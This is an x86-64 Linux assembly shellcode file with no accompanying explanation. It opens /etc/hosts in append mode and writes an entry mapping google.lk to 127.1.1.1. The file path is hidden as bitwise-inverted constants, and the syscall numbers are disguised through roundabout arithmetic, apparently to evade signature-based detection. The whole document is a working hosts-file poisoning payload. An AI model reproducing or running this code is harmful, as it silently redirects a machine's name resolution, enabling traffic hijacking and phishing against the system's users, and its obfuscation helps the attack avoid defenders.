global _start
    section .text

_start:
    ;open
    xor rax, rax 
    ;add rax, 2  ; open syscall
    add rax,10
    sub rax,8

    xor rdi, rdi
    xor rsi, rsi
    push rsi ; 0x00 
    ;mov r8, 0x2f2f2f2f6374652f ; stsoh/
    mov r8, 0xD0D0D0D09C8B9AD0
    not r8

    ;mov r10, 0x7374736f682f2f2f ; /cte/
    mov r10,0x8C8B8C9097D0D0D0
    not r10

    push r10
    push r8
    add rdi, rsp
    xor rsi, rsi
    add si, 0x401
    syscall

    ;write
    xchg rax, rdi
    xor rax, rax
    ;add rax, 1 ; syscall for write
    add rax,2
    dec rax

    jmp data

write:
    pop rsi 
    mov dl, 19 ; length in rdx
    syscall

    ;close
    xor rax, rax
    ;add rax, 3
    add rax,10
    sub rax,7
    syscall

    ;exit
    ;xor rax, rax
    ;mov al, 60
    push 32
    pop rax
    add rax, 28

    xor rdi, rdi
    syscall 

data:
    call write
    text db '127.1.1.1 google.lk'
